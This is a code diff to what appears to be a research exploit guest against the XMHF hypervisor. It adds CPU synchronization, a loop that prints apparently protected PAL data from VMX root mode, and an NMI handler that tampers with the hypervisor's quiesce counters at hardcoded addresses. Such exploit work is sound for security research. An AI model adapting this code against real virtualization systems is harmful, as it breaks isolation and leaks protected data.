@@ -3,6 +3,8 @@
 
 extern volatile u32 xmhf_baseplatform_arch_x86_smpinitialize_commonstart_flag;
 
+volatile u32 ap_restarted = 0;
+
 static void lhv_exploit(VCPU *vcpu)
 {
 	uintptr_t apic_page = PA_PAGE_ALIGN_4K(rdmsr64(MSR_APIC_BASE));
@@ -83,6 +85,16 @@ static void lhv_exploit(VCPU *vcpu)
 		}
 	}
 
+	/* Wait for AP to restart */
+	{
+		while (!ap_restarted) {
+			asm volatile ("pause");		/* Save energy when waiting */
+		}
+		printf("BSP synchronized 2\n");
+	}
+
+	enter_user_mode(vcpu, 0);
+
 	while (1) {
 		asm volatile ("hlt");
 	}
@@ -95,10 +107,40 @@ void lhv_exploit_vmxroot(VCPU *vcpu)
 		timer_init(vcpu);
 		asm volatile ("sti");
 	}
+	{
+		printf("AP synchronized 2\n");
+		ap_restarted = 1;
+	}
+	{
+		extern u8 pal_demo_data[MAX_VCPU_ENTRIES][PAGE_SIZE_4K];
+		while (1) {
+			printf("data=0x%08lx ", *(uintptr_t *)(pal_demo_data[0]));
+			asm volatile ("hlt");
+		}
+	}
 	while (1) {
-		printf("E%d ", vcpu->id);
 		asm volatile ("hlt");
 	}
+}
+
+void lhv_exploit_nmi_handler(VCPU *vcpu)
+{
+	volatile u32 *p_quiesce_counter             = (volatile u32 *)0x1025d104UL;
+	volatile u32 *p_lock_quiesce_counter        = (volatile u32 *)0x1025d108UL;
+	volatile u32 *p_quiesce_resume_counter      = (volatile u32 *)0x1025d10cUL;
+	volatile u32 *p_lock_quiesce_resume_counter = (volatile u32 *)0x1025d110UL;
+	volatile u32 *p_quiesce_resume_signal       = (volatile u32 *)0x1025d11cUL;
+	/* Copy the logic from xmhf_smpguest_arch_x86vmx_nmi_check_quiesce() */
+	spin_lock(p_lock_quiesce_counter);
+	(*p_quiesce_counter)++;
+	spin_unlock(p_lock_quiesce_counter);
+	while (!*p_quiesce_resume_signal) {
+		asm volatile ("pause");		/* Save energy when waiting */
+	}
+	spin_lock(p_lock_quiesce_resume_counter);
+	(*p_quiesce_resume_counter)++;
+	spin_unlock(p_lock_quiesce_resume_counter);
+	(void)vcpu;
 }
 
 void lhv_main(VCPU *vcpu)
